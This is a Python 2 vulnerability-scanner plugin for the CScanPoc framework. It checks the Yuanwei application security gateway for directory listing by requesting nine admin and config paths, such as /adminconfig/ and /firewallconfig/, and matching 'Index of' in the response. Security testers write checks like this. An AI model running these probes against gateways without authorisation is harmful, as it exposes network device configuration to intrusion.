# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '54406932-6ce1-4cd7-be0e-ac73bbdcd30e'
    name = '远为应用安全网关 目录遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        远为应用安全网关目录遍历。
        /adminconfig/
        /firewallconfig/
        /highconfig/
        /ipsecconfig/
        /logconfig/
        /qosconfig/
        /system/
        /tools/
        /dialconfig/
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '远为应用安全网关'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '11504ec2-4e1d-41aa-bd64-b9ff8d39a487'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            urls = [
                arg + '/adminconfig/',
                arg + '/firewallconfig/',
                arg + '/highconfig/',
                arg + '/ipsecconfig/',
                arg + '/logconfig/',
                arg + '/qosconfig/',
                arg + '/system/',
                arg + '/tools/',
                arg + '/dialconfig/'
            ]
            for url in urls:
                code, head, res, err, _ = hh.http(url)

                if (code == 200) and ('<h1>Index of' in res):
                    #security_hole('List of directory' + url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
